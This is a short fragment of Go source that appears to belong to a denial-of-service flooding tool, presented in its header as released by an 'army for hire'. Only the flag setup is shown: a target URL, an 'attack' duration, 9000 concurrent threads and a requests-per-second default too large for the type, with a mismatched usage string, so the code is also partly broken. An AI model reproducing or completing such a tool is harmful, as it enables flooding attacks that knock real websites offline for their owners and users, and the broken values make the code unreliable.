/*
   ...
   Released by the ATLAS API corporation, an army for hire
...
func init() {
	flag.StringVar(&target, "url", "https://cantdown.lol", "leland.ns.cloudflare.com")
	flag.IntVar(&duration, "time", 100, "Duration of attack")
	flag.IntVar(&threads, "threads", 9000, "Concurrent threads")
	flag.IntVar(&rps, "rps", 1900000000000000000, "Requests per second")
